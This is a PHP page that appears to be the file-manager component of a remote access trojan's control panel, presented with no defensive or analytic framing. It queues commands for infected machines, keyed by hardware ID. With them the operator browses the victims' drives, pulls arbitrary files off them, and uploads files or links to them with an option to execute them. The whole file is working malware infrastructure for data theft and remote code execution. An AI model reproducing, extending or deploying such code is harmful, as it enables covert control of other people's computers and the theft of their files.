<?php
	@ini_set("display_errors", 0);
	require_once("options.php");
?>
<html>
<body>
	<?php

	$actual_page = "flm.php?hwid=$hwid";
	$cmd_file = $dir_control."cmd.txt";

	if(isset($_GET['type']) && $_GET['type'] == "flm" || isset($_REQUEST['path_to_access'])){ ?>

	<a href="options.php?hwid=<?php echo $infos[0];?>" class="back"> << back </a>
	<div align="center" class="flm_input">
		<h1><?php echo $infos[2]." - ".$infos[0];?></h1>

		<table class="other_options_flm">
			<tr>
				<td><a href="flm.php?type=upload&hwid=<?php echo $hwid?>">Upload</a></td>
				<td><a href="flm.php?type=download&hwid=<?php echo $hwid?>">Download</a></td>
			</tr>
		</table>

		<form method="POST">
			Directory:</span><input type="text" name="path_to_access">
			<input type="submit" value="Go" class="go">
		</form>
	</div>
	<div align="center"><br>
		<table cellspacing="0">
		<?php
			if(isset($_REQUEST['path_to_access'])){
				$path_to_access = $_REQUEST['path_to_access'];

				if($path_to_access == "")
					$path = "";

				$path = "|".$path_to_access;

			} else {
				$path = "";
			}

			file_put_contents($cmd_file, "flm".$path);
			$output_flm = $dir_control."flm.txt";
			if(file_exists($output_flm)){
				$datas = file_get_contents($output_flm);
				$datas = explode("|", $datas);
				$qtd = count($datas)-1;

				if(isset($_GET['path_to_access'])){

					$last_access = "";
					$last_access .= $_GET['path_to_access'];

					$back = $last_access."..".DIRECTORY_SEPARATOR;

					echo "<tr><td><a href=$actual_page&type=flm>Get Drives</a></td></tr>";
					echo "<tr><td><a href=$actual_page&path_to_access=$back><< back</a></td></tr>";

				} else {
					$last_access = "";
				}

				for($i=0;$i<$qtd;$i++){
					$emoji = explode("]", $datas[$i]);
					if($emoji[0] == "[DIR")
						$emote = "&#x1F5C0 ";
					elseif($emoji[0] == "[FILE")
						$emote = "&#x1F5C5 ";
					elseif($emoji[0] == "[FIXED")
						$emote = "&#x1F5B4 ";
					elseif($emoji[0] == "[CDRom")
						$emote = "&#x1F4BF ";
					elseif($emoji[0] == "[Network")
						$emote = "&#x1F5A7 ";
					elseif($emoji[0] == "[Removable")
						$emote = "&#x23CF ";
					else
						$emote = "? ";

					$file_name = explode("[:]", $datas[$i]);
					$file_enc_name = rawurlencode($file_name[1]);

					echo "<tr><td><a href=$actual_page&path_to_access=$last_access$file_enc_name>$emote$file_name[0]</a></td></tr>";
				}
				header("Refresh: 5");
			}
		} elseif(isset($_GET['type']) && $_GET['type'] == "download"){ ?>

			<a href="flm.php?type=flm&hwid=<?php echo $infos[0];?>" class="back"> << back </a>
			<div align="center" class="flm_input">
				<h1><?php echo $infos[2]." - ".$infos[0];?></h1>
				<form method="POST">
					File Path:</span><input type="text" name="path_to_download" required>
					<input type="submit" value="Go" class="go">
				</form>
			</div>
		<?php

			$download_dir = $default_path . "downloads" . DIRECTORY_SEPARATOR;

			if(!file_exists($download_dir))
				mkdir($download_dir);

			if(isset($_POST['path_to_download'])){
				$path_download = rtrim($_POST['path_to_download'], DIRECTORY_SEPARATOR);

				$complete_path = explode(DIRECTORY_SEPARATOR, $path_download);

				$only_name_file = array_pop($complete_path);
				$path_to_save = $download_dir.$only_name_file;

				echo "<div align='center'><br><br>File to download: $path_download<br><br>Path to save: $path_to_save<br><br>Request Sended !</div>";
				file_put_contents($cmd_file, "dwl|".$path_download);
			}

		} elseif(isset($_GET['type']) && $_GET['type'] == "upload"){ ?>

			<a href="flm.php?type=flm&hwid=<?php echo $infos[0];?>" class="back"> << back </a>
			<div align="center" class="flm_input">
				<h1><?php echo $infos[2]." - ".$infos[0];?></h1>
				<form method="POST" class="upload_form">
					<select name="type_to_send">
						<option value="file">Select File</option>
						<option value="link">Link B64</option>
					</select>
					<input type="text" name="content_upload" class="link_up" required><br>
					Name: <input type="text" name="name_to_upload" class="link_up">
					Type: <input type="text" name="type_to_upload"><br>
					Dest Path: <input type="text" name="path_to_upload" class="link_up" required><br><br>
					Execute:
					<select name="execute">
						<option value="yes">Yes</option>
						<option value="no">No</option>
					</select><br><br>
					<input type="submit" value="Upload" class="go">
				</form>
			</div>
		<?php
			if(isset($_POST['type_to_send']) && isset($_POST['path_to_upload'])){

				$type_to_send = $_POST['type_to_send'];
				$name_to_source = $_POST['content_upload'];
				$name_to_upload = $_POST['name_to_upload'];
				$type_to_upload = $_POST['type_to_upload'];
				$dest_path = $_POST['path_to_upload'];
				$execute = $_POST['execute'];

				$name_to_source = rtrim($name_to_source, DIRECTORY_SEPARATOR);
				$complete_path = explode(DIRECTORY_SEPARATOR, $name_to_source);

				$only_name_file = array_pop($complete_path);
				$ext = explode(".", $only_name_file);

				if($type_to_send == "file"){
					$content_path = rtrim($name_to_source, DIRECTORY_SEPARATOR);

					if(!file_exists($content_path) || !is_file($content_path)){
						echo "<div align='center'>
						<br>
						No such source file: $content_path
						</div>";
						die();
					}

					$content_data = file_get_contents($content_path);
					$content_to_send = base64_encode($content_data);

					if($type_to_upload != ""){
						$type = ltrim($type_to_upload, ".");					
					} else
						$type = array_pop($ext);
					if($name_to_upload != "")
						$name = $name_to_upload;
					else
						$name = $ext[0];

				} elseif($type_to_send  == "link"){
					$content_to_send = rtrim($name_to_source, "/");
					if($type_to_upload == "" && $name_to_upload == ""){
						echo "<div align='center'><br>
							You need specify extension name and type to upload
						</div>";
						die();
					} elseif($type_to_upload == ""){
						echo "<div align='center'><br>
							You need specify extension type
						</div>";
						die();
					} else {
						$type = ltrim($type_to_upload, ".");
					} if($name_to_upload == ""){
						echo "<div align='center'><br>
							You need specify name to upload
						</div>";
						die();
					} else {
						$name = $name_to_upload;
					}
				}

				$path = rtrim($dest_path, DIRECTORY_SEPARATOR);

				$payload = "upl|".$type_to_send."|".$content_to_send."|".$name."|".$type."|".$path."|".$execute;

				if($type_to_send  == "file"){
					$source_path = "Source Path: ".$content_path;
				} else{
					$source_path = "Source Link: ".$content_to_send;
				}

				$dest_path = "Destination Path: ".$path.DIRECTORY_SEPARATOR.$name.".".$type;

				echo "<div align='center'>
				<br>
				$source_path<br><br>
				$dest_path<br><br>
				Request Sended !
				</div>";

				file_put_contents($cmd_file, $payload);	
			}
		} ?>
		</table>
	</div>
</body>
</html>